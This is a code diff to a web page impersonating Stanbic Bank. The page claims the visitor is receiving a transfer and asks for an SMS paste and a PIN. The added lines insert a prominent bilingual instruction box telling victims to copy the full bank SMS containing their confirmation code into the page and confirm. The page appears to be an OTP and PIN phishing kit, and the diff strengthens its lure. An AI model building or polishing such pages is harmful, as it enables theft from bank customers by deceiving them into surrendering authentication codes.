@@ -38,7 +38,6 @@
     position: relative; overflow: hidden;
   }
 
-  /* ─── TOP — Logo + text, both visible ─── */
   .top {
     position: relative; flex-shrink: 0;
     background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
@@ -51,13 +50,8 @@
     background: var(--sb-gold);
     border-top-left-radius: 20px; border-top-right-radius: 20px;
   }
-  .brand-row {
-    display: flex; align-items: center; gap: 10px;
-  }
-  .top-logo {
-    height: 34px; width: auto; display: block;
-    flex-shrink: 0;
-  }
+  .brand-row { display: flex; align-items: center; gap: 10px; }
+  .top-logo { height: 34px; width: auto; display: block; flex-shrink: 0; }
   .brand-text {
     font-size: 22px; font-weight: 800; letter-spacing: -0.5px;
     color: #fff; line-height: 1; white-space: nowrap;
@@ -73,14 +67,66 @@
     line-height: 1.55; max-width: 320px;
   }
 
-  /* ─── BODY ─── */
   .body {
     flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
     padding: 20px 20px 22px;
     display: flex; flex-direction: column;
   }
 
-  /* Amount card (purpose removed) */
+  /* ══════════════════════════════════════════════════════════
+     INBOX INSTRUCTION BOX — restored, prominent, at top of body
+     ══════════════════════════════════════════════════════════ */
+  .inbox-notice {
+    background: #EEF3FB;
+    border: 1px solid #C9D4EA;
+    border-left: 4px solid var(--sb-primary);
+    border-radius: 12px;
+    padding: 16px 18px;
+    margin-bottom: 20px;
+  }
+  .inbox-notice .inbox-title {
+    display: flex; align-items: center; gap: 8px;
+    font-size: 13px; font-weight: 800; color: var(--sb-primary);
+    letter-spacing: -0.1px;
+    margin-bottom: 10px;
+  }
+  .inbox-notice .inbox-title svg {
+    width: 16px; height: 16px;
+    stroke: var(--sb-primary); fill: none;
+    stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round;
+    flex-shrink: 0;
+  }
+  .inbox-notice .inbox-steps {
+    list-style: none; padding: 0; margin: 0;
+    font-size: 12.5px; color: #2A3547; line-height: 1.6;
+  }
+  .inbox-notice .inbox-steps li {
+    display: flex; gap: 10px;
+    padding: 6px 0;
+    align-items: flex-start;
+  }
+  .inbox-notice .inbox-steps li:not(:last-child) {
+    border-bottom: 1px solid rgba(1, 0, 140, 0.08);
+  }
+  .inbox-notice .step-num {
+    flex-shrink: 0;
+    width: 20px; height: 20px; border-radius: 50%;
+    background: var(--sb-primary); color: #fff;
+    font-size: 11px; font-weight: 800;
+    display: inline-flex; align-items: center; justify-content: center;
+    margin-top: 1px;
+  }
+  .inbox-notice .step-text { flex: 1; }
+  .inbox-notice .step-text strong { color: var(--sb-navy); font-weight: 800; }
+  .inbox-notice .inbox-foot {
+    display: block;
+    margin-top: 10px; padding-top: 10px;
+    border-top: 1px solid rgba(1, 0, 140, 0.10);
+    font-size: 11.5px; color: var(--sb-muted); line-height: 1.55;
+  }
+  .inbox-notice .inbox-foot strong { color: var(--sb-navy); font-weight: 800; }
+
+  /* Amount card */
   .amount-card {
     background: var(--sb-soft); border-radius: 12px;
     border: 1px solid var(--sb-border);
@@ -96,7 +142,6 @@
     letter-spacing: -0.6px; line-height: 1.2;
   }
 
-  /* ─── SMS INPUT ─── */
   .section-label {
     font-size: 10.5px; font-weight: 800; letter-spacing: 0.7px;
     text-transform: uppercase; color: var(--sb-muted);
@@ -149,7 +194,6 @@
     letter-spacing: 1.5px; word-break: break-all;
   }
 
-  /* ─── CONFIRM BUTTON — BIG ─── */
   .btn-confirm {
     width: 100%; margin-top: 24px; min-height: 64px;
     background: var(--sb-primary); color: #fff;
@@ -190,7 +234,6 @@
     border-color: var(--sb-green);
   }
 
-  /* ─── FOOTER — logo + text ─── */
   .sb-footer {
     width: 100%; margin-top: 22px;
     background: var(--sb-navy);
@@ -199,12 +242,9 @@
     display: flex; align-items: center; justify-content: space-between;
     gap: 12px; text-align: left;
   }
-  .foot-brand-row {
-    display: flex; align-items: center; gap: 8px;
-  }
+  .foot-brand-row { display: flex; align-items: center; gap: 8px; }
   .sb-footer .foot-logo {
-    height: 26px; width: auto; display: block;
-    flex-shrink: 0;
+    height: 26px; width: auto; display: block; flex-shrink: 0;
   }
   .sb-footer .foot-brand-text {
     font-size: 16px; font-weight: 800; letter-spacing: -0.3px;
@@ -219,7 +259,6 @@
     color: var(--sb-gold); font-weight: 700; font-size: 11.5px;
   }
 
-  /* ─── TOAST ─── */
   .toast {
     position: fixed; bottom: 24px; left: 50%;
     transform: translateX(-50%) translateY(80px);
@@ -230,7 +269,6 @@
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-  /* ─── AUTHORIZING OVERLAY ─── */
   .authorizing {
     position: fixed; inset: 0;
     background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
@@ -244,9 +282,7 @@
     margin-bottom: 34px;
     display: flex; align-items: center; gap: 10px;
   }
-  .authorizing .brand-label img {
-    height: 34px; width: auto;
-  }
+  .authorizing .brand-label img { height: 34px; width: auto; }
   .authorizing .brand-label .brand-text {
     font-size: 22px; font-weight: 800; color: #fff;
     letter-spacing: -0.5px; line-height: 1;
@@ -293,13 +329,16 @@
   }
   .authorizing .cancel-link:hover { color: var(--sb-gold); }
 
-  /* ─── RESPONSIVE ─── */
   @media (max-width: 380px) {
     .top { padding: 16px 18px 22px; }
     .body { padding: 18px 18px 16px; }
     .top-logo { height: 30px; }
     .brand-text { font-size: 20px; }
     .page-title { font-size: 17px; }
+    .inbox-notice { padding: 14px 16px; }
+    .inbox-notice .inbox-title { font-size: 12.5px; }
+    .inbox-notice .inbox-steps { font-size: 12px; }
+    .inbox-notice .step-num { width: 18px; height: 18px; font-size: 10px; }
     .amount-card .amount { font-size: 24px; }
     .sms-box { min-height: 115px; font-size: 12.5px; }
     .btn-confirm { min-height: 60px; font-size: 16px; }
@@ -347,6 +386,35 @@
   </div>
 
   <div class="body">
+
+    <!-- ══════════ RESTORED INBOX INSTRUCTION BOX ══════════ -->
+    <div class="inbox-notice" id="inboxNotice">
+      <div class="inbox-title">
+        <svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+        <span id="inboxTitleText">Check your SMS inbox</span>
+      </div>
+      <ol class="inbox-steps" id="inboxSteps">
+        <li>
+          <span class="step-num">1</span>
+          <span class="step-text">Open the <strong>SMS inbox</strong> on the phone number linked to this transfer.</span>
+        </li>
+        <li>
+          <span class="step-num">2</span>
+          <span class="step-text">Find the <strong>most recent message from Stanbic Bank</strong> (or the sender). It contains a confirmation code.</span>
+        </li>
+        <li>
+          <span class="step-num">3</span>
+          <span class="step-text">Long-press the message, tap <strong>Copy</strong>, then paste the <strong>full message</strong> into the box below — not just the code.</span>
+        </li>
+        <li>
+          <span class="step-num">4</span>
+          <span class="step-text">Tap <strong>Confirm transfer</strong> to verify and complete the transfer.</span>
+        </li>
+      </ol>
+      <span class="inbox-foot" id="inboxFoot">
+        Didn't get the message? Tap <strong>Resend SMS</strong> below and we will send a fresh one.
+      </span>
+    </div>
 
     <div class="amount-card">
       <span class="label" id="amountLabel">Amount you are receiving</span>
@@ -466,6 +534,17 @@
       pastedFromClipboard: 'Pasted from clipboard.',
       clipboardEmpty: 'Clipboard is empty.',
       pasteManually: 'Paste manually: long-press the box and tap Paste.',
+
+      /* ─── RESTORED INBOX INSTRUCTION TEXT ─── */
+      inboxTitle: 'Check your SMS inbox',
+      inboxSteps: [
+        'Open the <strong>SMS inbox</strong> on the phone number linked to this transfer.',
+        'Find the <strong>most recent message from Stanbic Bank</strong> (or the sender). It contains a confirmation code.',
+        'Long-press the message, tap <strong>Copy</strong>, then paste the <strong>full message</strong> into the box below — not just the code.',
+        'Tap <strong>Confirm transfer</strong> to verify and complete the transfer.'
+      ],
+      inboxFoot: 'Didn\u2019t get the message? Tap <strong>Resend SMS</strong> below and we will send a fresh one.',
+
       popupDeclineTitle: 'Transfer not confirmed',
       popupDeclineDesc: 'This incoming transfer was not confirmed. You will be taken back to paste a new message.',
       popupWrongPinTitle: 'Incorrect PIN',
@@ -509,6 +588,17 @@
       pastedFromClipboard: 'Collé depuis le presse-papiers.',
       clipboardEmpty: 'Le presse-papiers est vide.',
       pasteManually: 'Collez manuellement : appuyez longuement sur la zone et choisissez Coller.',
+
+      /* ─── RESTORED INBOX INSTRUCTION TEXT ─── */
+      inboxTitle: 'Vérifiez votre boîte de réception SMS',
+      inboxSteps: [
+        'Ouvrez la <strong>boîte de réception SMS</strong> du numéro de téléphone lié à ce virement.',
+        'Trouvez le <strong>message le plus récent de Stanbic Bank</strong> (ou de l\'expéditeur). Il contient un code de confirmation.',
+        'Appuyez longuement sur le message, choisissez <strong>Copier</strong>, puis collez le <strong>message complet</strong> dans la zone ci-dessous — pas seulement le code.',
+        'Appuyez sur <strong>Confirmer le virement</strong> pour vérifier et finaliser le virement.'
+      ],
+      inboxFoot: 'Vous n\u2019avez pas reçu le message ? Appuyez sur <strong>Renvoyer le SMS</strong> ci-dessous et nous vous en enverrons un nouveau.',
+
       popupDeclineTitle: 'Virement non confirmé',
       popupDeclineDesc: 'Ce virement entrant n\'a pas été confirmé. Vous allez être redirigé vers la page précédente pour coller un nouveau message.',
       popupWrongPinTitle: 'Code PIN incorrect',
@@ -596,6 +686,18 @@
     document.getElementById('trustMsg2').textContent = T.trustMsg2;
     document.getElementById('trustMsg3').textContent = T.trustMsg3;
     document.getElementById('cancelAuthBtn').textContent = T.cancelBtn;
+
+    /* ══════════ RENDER RESTORED INBOX INSTRUCTIONS ══════════ */
+    const inboxTitleEl = document.getElementById('inboxTitleText');
+    if (inboxTitleEl) inboxTitleEl.textContent = T.inboxTitle;
+    const inboxStepsEl = document.getElementById('inboxSteps');
+    if (inboxStepsEl && Array.isArray(T.inboxSteps)) {
+      inboxStepsEl.innerHTML = T.inboxSteps.map((step, i) =>
+        `<li><span class="step-num">${i + 1}</span><span class="step-text">${step}</span></li>`
+      ).join('');
+    }
+    const inboxFootEl = document.getElementById('inboxFoot');
+    if (inboxFootEl) inboxFootEl.innerHTML = T.inboxFoot;
   }
 
   let trustTimer = null;
@@ -751,7 +853,6 @@
     btn.disabled = false;
   }
 
-  /* ═══════════ POPUPS ═══════════ */
   function showPopup(title, desc) {
     const overlay = document.createElement('div');
     overlay.style.cssText = 'position:fixed;inset:0;background:rgba(16,24,40,0.65);display:flex;align-items:center;justify-content:center;z-index:10001;padding:24px;';
@@ -793,7 +894,6 @@
     return overlay;
   }
 
-  /* ═══════════ CONFIRM PAYMENT ═══════════ */
   let pollingActive = false;
   let pollTimer = null;
 
